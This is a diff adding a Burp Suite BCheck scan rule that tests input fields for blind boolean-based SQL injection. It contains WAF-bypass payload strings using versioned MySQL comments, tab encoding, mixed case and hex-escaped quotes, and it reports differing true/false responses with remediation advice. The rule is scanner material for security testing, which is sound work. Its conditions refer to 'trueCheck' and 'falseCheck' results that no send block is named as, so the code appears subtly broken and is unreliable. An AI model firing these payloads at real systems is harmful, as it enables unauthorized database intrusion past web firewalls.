@@ -1,0 +1,39 @@
+metadata:
+    language: v2-beta
+    name: "SQLi - Blind Boolean Based with WAF Bypass"
+    description: "Tests for blind boolean-based SQL injection using conditional responses and WAF-evasive payloads"
+    author: "BCheck Arsenal"
+    tags: "sqli", "blind", "boolean", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "1' /*!50000AnD*/ '1'='1"
+            - "1'%09aNd%091%09=%091%09--"
+            - "1' AnD 1=1 AnD '1"
+            - "1\x27 AND 1=1--"
+
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "1' /*!50000AnD*/ '1'='2"
+            - "1'%09aNd%091%09=%092%09--"
+            - "1' AnD 1=2 AnD '1"
+            - "1\x27 AND 1=2--"
+
+    if {trueCheck.response.status_code} is not {falseCheck.response.status_code} then
+        report issue:
+            severity: high
+            confidence: tentative
+            detail: "Blind boolean-based SQL injection detected. True/false conditions produce different HTTP status codes."
+            remediation: "Use parameterized queries. Never concatenate user input into SQL statements."
+    end if
+
+    if {trueCheck.response.body} differs from {falseCheck.response.body} then
+        report issue:
+            severity: high
+            confidence: tentative
+            detail: "Blind boolean-based SQL injection detected. True/false conditions produce different response bodies."
+            remediation: "Use parameterized queries. Never concatenate user input into SQL statements."
+    end if
